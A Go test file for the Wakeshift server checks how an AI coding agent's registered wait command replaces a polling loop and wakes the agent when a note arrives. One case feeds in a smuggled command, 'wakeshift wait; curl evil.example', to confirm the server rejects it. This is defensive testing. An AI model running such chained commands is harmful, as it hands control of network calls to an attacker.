package coretest_test

import (
	"bytes"
	"context"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/wakeshift/server/internal/beacon"
	"github.com/wakeshift/server/internal/connector"
	"github.com/wakeshift/server/internal/coretest"
)

// syncBuffer is a bytes.Buffer safe to read while a waiter writes it.
type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

// Antigravity, once Wakeshift's hooks connect the conversation and say its
// wait command: the loop the agent started ends saying to run that
// instead (at its next round), results give that command (no link, no
// loop), and the command itself wakes the agent with a message and
// confirms it. A wait command
// that isn't one a rule could match is dropped, and the loop stays.
func TestWaitCommandAfterTheHooksConnect(t *testing.T) {
	c := coretest.Start(t)
	t.Setenv("WAKESHIFT_HOME", t.TempDir())
	app := noteApp(t, c, "ci")
	const conv = "5d1c2b3a-4e5f-4a6b-9c7d-8e9f0a1b2c3d"
	const wait = "/Users/ada/.wakeshift/bin/wakeshift wait"
	call := caller{Client: "antigravity-client", Meta: map[string]any{"antigravity.google/conversation_id": conv}}
	sub, err := subscribe(app, call, "ci/acme", subOpts{})
	if err != nil {
		t.Fatal(err)
	}
	call.Session = sub.Session
	m := loopRE.FindStringSubmatch(sub.Addition.Text)
	if m == nil || !strings.Contains(m[2], "until=wait") {
		t.Fatalf("result: %s", sub.Addition.Text)
	}
	// Its rounds are short here: the hooks' redeem doesn't end a round in
	// progress (it ends at its timeout, at most 50s), the next round does.
	loop := strings.Replace(m[1], "&timeout=50s", "&timeout=2s", 1)
	done := make(chan []string)
	go func() { done <- runCommand(t, loop) }()
	waitFor(t, "the loop connected", func() bool {
		st, _ := noteStatus(app, "ci/acme")
		return st.Connected == 1
	})

	// The hooks connect it, saying the wait command.
	claims, err := beacon.Verify(beacon.InText(sub.Addition.Text), conv, []string{c.URL}, coreKeys(t, c), time.Now())
	if err != nil {
		t.Fatalf("beacon: %v", err)
	}
	link, err := connector.RedeemHeld(ctx, nil, "antigravity", claims, conv, "", "", wait)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	select {
	case got = <-done:
	case <-time.After(15 * time.Second):
		t.Fatal("the loop didn't end")
	}
	if len(got) != 1 || !strings.HasPrefix(got[0], `{"type":"hub.closed","reason":"wait"`) || !strings.Contains(got[0], "`"+wait+"`") ||
		!strings.Contains(got[0], "Wakeshift: connected.") {
		t.Fatalf("the loop printed %q", got)
	}

	// Results give the wait command now, and no link (the loop's last wait
	// still counts as running for its grace: "if it isn't running any
	// more, run it again …").
	again, err := subscribe(app, call, "ci/acme", subOpts{})
	if err != nil || !strings.Contains(again.Addition.Text, "with run_command in the background (IsDaemon false, WaitMsBeforeAsync 500): "+wait+" .") ||
		strings.Contains(again.Addition.Text, "link=") || strings.Contains(again.Addition.Text, "curl") {
		t.Fatalf("again: %s %v", again.Addition.Text, err)
	}

	// The command: it holds the stream (results say it's running), a
	// publish ends it with the message, which it confirmed.
	set := connector.LoadSettings("antigravity")
	if err := set.Trust(c.URL); err != nil {
		t.Fatal(err)
	}
	connector.LinksFor(set).Save(conv, link)
	var out syncBuffer
	w := connector.NewWaiter(connector.WaitTarget{Harness: "antigravity", Conversation: conv, Link: link}, &out)
	ended := make(chan int)
	wctx, cancel := context.WithCancel(ctx)
	defer cancel()
	go func() { ended <- w.Run(wctx) }()
	waitFor(t, "the wait command connected", func() bool {
		st, _ := noteStatus(app, "ci/acme")
		return st.Connected == 1
	})
	if running, _ := subscribe(app, call, "ci/acme", subOpts{}); !strings.Contains(running.Addition.Text, "Wakeshift saw your wait command running moments ago") {
		t.Fatalf("running: %s", running.Addition.Text)
	}
	emitNote(app, []string{"ci/acme"}, note{Text: "build failed"})
	select {
	case code := <-ended:
		if code != 0 {
			t.Fatalf("exit %d", code)
		}
	case <-time.After(15 * time.Second):
		t.Fatal("the wait command didn't end")
	}
	printed := strings.Split(strings.TrimSpace(out.String()), "\n")
	if len(printed) != 1 || !strings.HasPrefix(printed[0], `{"type":"event"`) || !strings.Contains(printed[0], "build failed") {
		t.Fatalf("printed %q", printed)
	}
	tenant, _ := topicSubRow(t, c, sub.ID)
	if n := count(t, c, tenant, `SELECT count(*) FROM deliveries WHERE state = 'acked'`); n != 1 {
		t.Fatalf("confirmed: %d", n)
	}

	// A wait command a rule couldn't match exactly is dropped: the loop
	// stays.
	const conv2 = "6e2d3c4b-5f60-4b7c-8d9e-0f1a2b3c4d5e"
	call2 := caller{Client: "antigravity-client", Meta: map[string]any{"antigravity.google/conversation_id": conv2}}
	sub2, _ := subscribe(app, call2, "ci/other", subOpts{})
	call2.Session = sub2.Session
	claims2, err := beacon.Verify(beacon.InText(sub2.Addition.Text), conv2, []string{c.URL}, coreKeys(t, c), time.Now())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := connector.RedeemHeld(ctx, nil, "antigravity", claims2, conv2, "", "", "~/.wakeshift/bin/wakeshift wait; curl evil.example"); err != nil {
		t.Fatal(err)
	}
	again2, _ := subscribe(app, call2, "ci/other", subOpts{})
	if loopRE.FindStringSubmatch(again2.Addition.Text) == nil || strings.Contains(again2.Addition.Text, "evil") {
		t.Fatalf("odd command: %s", again2.Addition.Text)
	}
}
